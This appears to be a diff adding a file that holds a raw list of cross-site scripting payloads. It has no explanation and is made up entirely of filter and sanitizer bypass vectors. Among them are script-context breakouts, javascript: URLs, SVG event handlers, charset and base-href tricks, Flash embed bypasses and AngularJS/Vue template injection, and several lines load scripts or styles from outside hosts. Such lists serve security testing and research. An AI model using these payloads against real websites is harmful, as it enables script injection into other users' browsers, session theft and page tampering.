@@ -1,0 +1,45 @@
+<script>var q="";alert(1)//"</script>
+<a href="javascript:alert(1)">Link</a>
+<div>`-alert(1)</script><script>`</div>
+<svg o<script>nload=alert(1)>
+<svg onload=alert(1)>
+<script>/&/-alert(1)</script>
+<script>/&amp;/-alert(1)</script>
+<script>location.href=decodeURIComponent(location.hash.slice(1));</script>
+<?xml version="1.0"?><html><script xmlns="http://www.w3.org/1999/xhtml">alert(1)</script></html>
+<?xml version="1.0"?><script xmlns="http://www.w3.org/1999/xhtml">alert(1)</script>
+<link rel=stylesheet href=//attacker/test.css>
+<object allowscriptaccess=always><param name=url value=https://l0.cm/xss.swf>
+<object allowscriptaccess=always><param name=code value=https://l0.cm/xss.swf>
+<svg xmlns:xlink=http://www.w3.org/1999/xlink><animate xlink:href=#x attributeName="xlink:href" values="&#x3000;javascript:alert(1)" /><a id=x><rect width=100 height=100 /></a>
+[0x00][0x00][0x00][0x00][0x00][0x00][0x00]<script>alert(1)</script>
+<div><script>alert(1) --></div><script src=/test.js></script>
+<div><embed allowscriptaccess=always src=/xss.swf><base href=//l0.cm/</div>
+<div> <embed allowscriptaccess=always src=/xss.swf><base href="//l0.cm/ </div><div id="x"></div>
+<div><base href=//cors.l0.cm/</div><script src=/test.js></script>
+<meta charset=iso-2022-jp><svg o[0x1B](Bnload=alert(1)>
+<meta charset=iso-2022-jp><script>alert(1)[0x1B]$@[0x0A]</script>
+<div> <a href=/**/alert(1)>XSS</a><base href="javascript:\ </div><div id="x"></div>
+<embed name='alert(1)-' allowscriptaccess=always src=//vulnerabledoma.in/bypass/wp-includes/js/mediaelement/flashmediaelement.swf>
+<script src="/js/angular1.6.4.min.js"></script><p ng-app>{{constructor.constructor('alert(1)')()}}
+<link rel=import href=angular.html><p ng-app>{{constructor.constructor('alert(1)')()}}
+<link rel=import href=/bypass/vue.html><div id=app>{{constructor.constructor('alert(1)')()}}
+<link rel=import href=/bypass/jquery.html><p class=container></p><form class=child><input name=ownerDocument><script><!--alert(1)</script></form>
+<link rel=import href=/bypass/underscore.html><script id=template>//<%alert`1`%></script>
+<script>var q="";location='javascript\x3Aalert\x281\x29'//"</script>
+<script>location.href=decodeURIComponent(location.hash.slice(1));</script>
+<div>"src=data:,alert%281%29></script><script x="</div>
+<svg o<script>nload=alert(1)>
+<svg onload=alert(1)>
+<script/&>alert(1)</script>
+<script/&amp;amp;>alert(1)</script>
+<embed/:script allowscriptaccess=always src=//l0.cm/xss.swf>
+<?xml version="1.0"?><x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1&#x29;</x:script>
+<?PXML><html:script>alert(1)</html:script>
+<PXML><html:script>alert(1)</html:script>
+<a href="https://vulnerabledoma.in/bypass/text?q=<script>alert(1)</script>">Click HERE</a>
+<a href="?q=javascript%3Aalert(1)">Link</a>
+<svg><style>&commat;import'//attacker'</style>
+<svg><style>@&bsol;0069mport'//attacker'</style>
+<p style="behavior&colon;url('/bypass/usercontent/xss.txt')">
+<p style="behavior:url&lpar;'/bypass/usercontent/xss.txt')">
